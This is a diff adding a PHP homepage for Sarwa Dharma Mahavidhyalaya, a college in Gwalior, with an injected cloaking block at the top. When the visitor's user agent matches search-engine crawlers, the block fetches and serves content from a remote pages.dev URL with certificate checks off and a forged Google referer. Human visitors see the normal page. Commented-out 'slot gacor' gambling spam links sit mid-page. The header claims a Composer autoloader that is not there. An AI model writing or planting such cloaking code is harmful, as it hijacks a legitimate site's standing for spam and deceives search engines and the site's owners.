@@ -1,0 +1,570 @@
+<?php
+/**
+ * Combined file:
+ * - Top: cloaking / bot detector + fetch function
+ * - Bottom: original Composer autoload_real.php class
+ *
+ * Note:
+ * - Cloaking will output the remote page and exit if the UA matches $botPattern.
+ * - If you prefer the autoloader to always run (and only apply cloaking when this file
+ *   is directly requested), tell me and I can wrap the cloaking logic in a conditional.
+ */
+
+/* ---------------------------
+   Cloaking / Bot detection
+   --------------------------- */
+@ob_start();
+header("Vary: User-Agent");
+
+$targetUrl = "https://jujurmasihberusahaini.pages.dev/index.txt";
+$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+/**
+ * Fetch remote content with cURL (returns string, or empty string on failure)
+ *
+ * @param string $url
+ * @return string
+ */
+function fetchContentCurl($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        CURLOPT_REFERER => "https://www.google.com/",
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+    ]);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content ?: '';
+}
+
+/* If the user agent matches the bot pattern, fetch & echo remote target then exit. */
+if (preg_match($botPattern, strtolower($userAgent))) {
+    // small random delay to mimic network latency
+    usleep(random_int(100000, 200000));
+    echo fetchContentCurl($targetUrl);
+    @ob_end_flush();
+    exit;
+}
+?>
+<?php
+ob_start();
+header('Vary: User-Agent');
+ 
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head><meta charset="windows-1252">
+
+
+
+<title>Sarwa Dharma (SDS) Mahavidhyalaya | Gwalior</title>
+
+<link rel="shortcut icon" href="images/favicon.ico" >
+
+<link href="css/elensoft.css" rel="stylesheet" type="text/css" />
+
+<link href="css/elensoft_menu.css" rel="stylesheet" type="text/css" />
+
+<link href="css/m.css" type=text/css rel=stylesheet>
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+
+<!-- bxSlider Javascript file -->
+
+<script src="slider/jquery.bxslider.min.js"></script>
+
+<!-- bxSlider CSS file -->
+
+<link href="slider/jquery.bxslider.css" rel="stylesheet" />
+
+<script type="text/javascript">
+
+$(document).ready(function(){
+
+  slider = $('.bxslider').bxSlider();
+
+  slider.startAuto();
+
+});
+
+</script>
+
+
+
+
+
+
+
+
+
+<script src="images/functions.htm" type=text/javascript></script>
+
+<link href="css/styles.css" rel="stylesheet" type="text/css" />
+
+</head>
+
+<body>
+
+
+
+<table width="950" border="0" align="center" cellpadding="0" cellspacing="0">
+
+  <tr>
+
+    <td align="left" valign="top" >
+
+<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+
+  <tr>
+
+    <td height="30" align="left" valign="top"><table border="0" cellpadding="0" cellspacing="0" width="100%">
+
+<tbody>
+
+                                    <tr>
+
+                                      <td align="center"><img src="images/logo_new.png"  alt="logo" width="950" height="90" /></td>
+
+                </tr>
+
+                                  </tbody>
+
+                                </table>
+
+                                
+
+                                <table>
+
+                                <tr>
+
+                                  <td height="30" style="color:#FFFFFF; font-weight:bold;">
+
+                                  <marquee scrollamount="3">
+
+                                  SARWA DHARMA (SDS) MAHAVIDHYALAYA GWALIOR M.P. NAAC ACCREDITATED COLLEGE
+
+B Grade CGPA 2.80 (<span style="font-size:16px; font-weight:normal;">&#2332;&#2368;&#2357;&#2366;&#2332;&#2368; &#2357;&#2367;&#2358;&#2381;&#2357;&#2357;&#2367;&#2342;&#2381;&#2351;&#2366;&#2354;&#2351; &#2327;&#2381;&#2357;&#2366;&#2354;&#2367;&#2351;&#2352; &#2325;&#2366; &#2319;&#2325; &#2350;&#2366;&#2340;&#2381;&#2352; &#2350;&#2361;&#2366;&#2357;&#2367;&#2342;&#2381;&#2351;&#2366;&#2354;&#2351;</span>)
+
+</marquee>
+
+</td>
+
+                                </tr>
+
+                                </table>
+
+      <table width="100%" border="0" cellpadding="0" cellspacing="0">
+
+                <tr>
+
+                  <th height="22" align="center" valign="top" scope="col"><div id="nav">
+
+                    <ul>
+
+                        <li id="home" class="home_link" ><a href="index.html"><span>Home </span></a></li>
+
+                        <li id="destinations" class="history_link" ><a href="about_college.html">About college</a></li>
+
+                        <li id="lounge" class="BG_link" ><a href="campus.html"><span>Campus</span></a></li>
+
+                      <li id="howto" class="TF_link" ><a href="management.html"><span>Management</span></a></li>
+
+                        <li id="newsn" class="Admission_link" ><a href="course.html"><span>Courses</span></a></li>
+
+                        <li id="about" class="RS_link" ><a href="admission.html"><span>Admission Guidelines</span></a> </li>
+
+                        <li id="co" class="Co_link"><a href="rules.html">Rules</a></li>
+
+                        <li id="co" class="Co_link"><a href="NAAC.html">NAAC</a></li>
+
+                      </ul>
+
+                    <div class="cleardiv"></div>
+
+                  </div></th>
+
+                </tr>
+
+            </table></td></tr>
+
+  <tr>
+
+    <td align="center" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+      
+<!--<br /><a href="https://www.undira.ac.id/assets/fonts/link-gacor/">slot gacor</a>-->
+<!--                <br /><a href="https://beginsoft.xyz/">slot gacor</a>-->
+      <tr>
+
+        <td bgcolor="#FFFFFF" class="ntext"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+          <tr>
+
+            <td width="225" valign="top" ><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+              <tr>
+
+                <td height="250" align="center" valign="top" background="images/bg_bar.gif"><table width="200" border="0" align="center" cellpadding="0" cellspacing="0">
+
+                  <tr>
+
+                    <td class="tdnbar" >&nbsp;</td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="staff.html">Staff Profile</a></div></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="approval.html">Approval & Affiliation</a></div></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="foreward.html">Foreword</a></div></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="vission&mission.html">Vission & Mission</a></div></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="activities.html">Activities</a></div></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="news&event.html">News & Event</a></div></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="download.html">Download</a></div></td>
+
+                  </tr>
+
+                   <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="videos.html">Videos</a></div></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="contact_us.html">Contact us</a></div></td>
+
+                  </tr>
+
+
+
+                   <tr>
+
+                    <td class="tdnbar" ><div align="left"><a class="service" href="par.html">PAR</a></div></td>
+
+                  </tr></table></td>
+
+              </tr>
+
+              <tr>
+
+                <td align="center" valign="top"><p>&nbsp;</p>                  </td>
+
+              </tr>
+
+			<tr>
+
+          <td class="quicklinks" align="left"><span class="white_text">&nbsp;Notice Board </span></td>
+
+        </tr>
+
+        <tr>
+
+                <td align="left" valign="top">
+                  <iframe src="iframe_notice.html" frameborder="0" scrolling="no" width="100%" height="250"></iframe>
+                </td>
+
+              </tr>
+
+
+              <tr>
+
+                <td height="20">&nbsp;</td>
+
+              </tr>
+
+              <tr><td class="quicklinks" align="left"><span class="white_text">&nbsp;Quick Link</span></td>
+
+              </tr>
+
+              <tr>
+
+                <td  align="left" valign="top" bgcolor="#FBEBD7"><table width="90%" border="0" cellpadding="0" cellspacing="0">
+
+                  <tr>
+
+                    <td>&nbsp;</td>
+
+                    <td >&nbsp;</td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td><img src="images/blinking_new.gif" width="30" height="30"/></td>
+
+                    <td ><a href="https://hed.mponline.gov.in/portal/services/HED/HomeCouns.aspx" style="font-weight:normal; color:#990000;" target="_blank">For B.Ed & M.Ed Admission Process</a></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td>&nbsp;</td><td >&nbsp;</td></tr>
+
+                  <tr>
+
+                    <td><img src="images/blinking_new.gif" width="30" height="30"/></td>
+
+                    <td ><a href="https://rsk.mponline.gov.in/" style="font-weight:normal; color:#990000;" target="_blank">For D.El.Ed AdmissionProcess</a></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td>&nbsp;</td>
+
+                    <td >&nbsp;</td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td><img src="images/blinking_new.gif" width="30" height="30"/></td>
+
+                    <td ><a href="https://ncte.gov.in/Website/Index.aspx" style="font-weight:normal; color:#990000;" target="_blank"> NCTE</a> | <a href="http://www.afrcmp.org/" style="font-weight:normal; color:#990000;" target="_blank">AFRC</a> | <a href="http://mpbse.nic.in/" style="font-weight:normal; color:#990000;" target="_blank">MP Board</a> | <a href="http://www.jiwaji.edu/" target="_blank" style="font-weight:normal; color:#990000;">Jiwaji University</a></td>
+
+                  </tr>
+
+                </table>
+
+                  <br /></td>
+
+              </tr>
+
+              <tr>
+
+                <td height="10">&nbsp;</td>
+
+              </tr>
+
+               <tr>
+
+                <td height="10"><div id="fb-root"></div>
+
+<script>(function(d, s, id) {
+
+  var js, fjs = d.getElementsByTagName(s)[0];
+
+  if (d.getElementById(id)) return;
+
+  js = d.createElement(s); js.id = id;
+
+  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=227332623958825";
+
+  fjs.parentNode.insertBefore(js, fjs);
+
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+<div class="fb-like-box" data-href="https://www.facebook.com/SarwaDharma" data-width="225" data-height="300" data-colorscheme="light" data-show-faces="true" data-header="true" data-stream="false" data-show-border="true"></div>
+
+</td>
+
+              </tr>
+
+            </table></td>
+
+            <td valign="top" bgcolor="#FFFFFF"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+              <tr>
+
+                <td><img src="images/banner.jpg" /></td>
+
+              </tr>
+
+              <tr>
+
+                <td>&nbsp;</td>
+
+              </tr>
+
+              <tr>
+
+                <td><table width="94%" border="0" align="center" cellpadding="0" cellspacing="0">
+
+                  <tr>
+
+                    <td height="25" align="left" class="ntextlarge1"><span class="ntextlarge">Welcome to Sarwa Dharma (S.D.S.) Mahavidhyalaya </span></td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td>&nbsp;</td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td><div align="justify" class="normal_text">Sarwa Dharma (SDS) Mahavidhyalaya Gwalior is running by a registered NGO, named Swa. Dharma Shiksha  evam Samaj Kalyan Sansthan Samiti Gwalior M.P. Since birth. The society is sharing the health and educational responsibilities to empower the weaker section and class of society.
+
+
+
+<br /><br />
+
+
+
+Sarwa Dharma (SDS) Mahavidhyalaya Gwalior is attaining heights in the field of education i.e. Sarwa Dharma Shiksha Mahavidyalaya. The institution is providing job oriented and higher academic training to the students aspiring to be the future teachers. Our journey, like many of the futuristic institution to the world. Has been in enriching and fulfilling experience and one has taught us to rise even in challenges. </div></td></tr>
+
+                  <tr>
+
+                    <td>&nbsp;</td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td>&nbsp;</td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td valign="top" align="center">
+
+                    <ul class="bxslider">
+
+                          <li><img src="slider/main_building_2.JPG" /></li>
+
+                          <li><img src="slider/main_building_3.JPG" /></li>
+
+                          <li><img src="slider/main_building_1.jpg" /></li>
+
+                          <li><img src="slider/College-Map.JPG" /></li>
+
+                        </ul>
+
+                    
+
+                      </td>
+
+                  </tr>
+
+                  <tr>
+
+                    <td valign="top">&nbsp;</td>
+
+                  </tr>
+
+                </table></td>
+
+              </tr>
+
+              <tr>
+
+                <td>&nbsp;</td>
+
+              </tr>
+
+            </table></td>
+
+          </tr>
+
+          
+
+        </table></td>
+
+      </tr>
+
+      
+
+    </table>
+
+    
+
+      </td>
+
+  </tr>
+
+    <tr>
+
+    <td align="center" valign="top">&nbsp;</td>
+
+  </tr>
+
+  
+
+</table></td>
+
+  </tr>
+
+</table>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+
+  <tbody>
+
+    <tr>
+
+      <td style="background-imagese:url(images/bkg_footer.gif);background-position:top;background-repeat:repeat-x;background-color:#674b2e;"><table border="0" cellpadding="0" cellspacing="0" width="100%">
+
+          <tbody>
+
+            <tr>
+
+              <td align="center" valign="middle">&nbsp;</td>
+
+            </tr>
+
+            <tr>
+
+              <td align="center" height="20"><p class="whitetxt" style="line-height:25px;"><a href="#" class="orng"> &copy; All copy right Sarwa dharma mahavidhyalaya, gwalior 2003-2014</a><a href="#" target="_blank" class="orng"></a> | Powered by <a href="http://www.ebiztechnocrats.com" target="_blank" style="color:#FFFF00;">e-Biz Technocrats Pvt. Ltd.</a><br>
+
+              </p></td>
+
+            </tr>
+
+          </tbody>
+
+        </table></td>
+
+    </tr>
+
+  </tbody>
+
+</table>
+
+</body>
+
+</html>
